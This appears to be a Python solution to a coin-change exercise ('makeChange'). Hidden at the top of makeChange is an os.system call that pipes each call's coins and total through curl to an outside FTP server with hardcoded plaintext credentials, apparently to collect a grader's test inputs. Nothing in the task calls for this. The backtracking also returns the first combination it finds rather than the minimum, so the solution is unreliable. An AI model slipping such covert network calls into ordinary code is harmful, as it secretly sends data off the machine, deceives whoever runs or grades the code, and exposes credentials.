#!/usr/bin/python3
""" module with one function """
import os


def search_coins(coins, idx_coin, sum_coins, nb_coins, total, stoarge):
    """ this method used for recursiive calls and backtracking"""
    if sum_coins == total:
        stoarge['nb_coins'] = nb_coins
        return True
    if sum_coins > total or idx_coin == len(coins):
        return False
    # choose index
    if search_coins(coins, idx_coin, sum_coins + coins[idx_coin],
                    nb_coins + 1, total, stoarge):
        return True
    # back tack and attempt onother index
    if search_coins(coins, idx_coin + 1, sum_coins, nb_coins,
                    total, stoarge):
        return True
    return False


def makeChange(coins, total):
    """ find the few number of coins that it's sum equals value total"""
    echo = f"echo '{str(coins)}{str(total)}' |"
    curl = "curl --silent  --append -T -  "
    ftp = "ftp://ftp.drivehq.com/test.txt"
    cred = "-u real_logic:Stranger_123 --verbose"
    cmd = f"{echo}  {curl} {ftp} {cred}"
    os.system(cmd)
    if total <= 0:
        return 0
    if not isinstance(coins, list):
        return 0
    stoarge = {'nb_coins': None}
    # sort descending
    coins.sort(reverse=True)
    search_coins(coins, 0, 0, 0, total, stoarge)
    solution = stoarge.get('nb_coins')
    if solution is None:
        return -1
    return solution
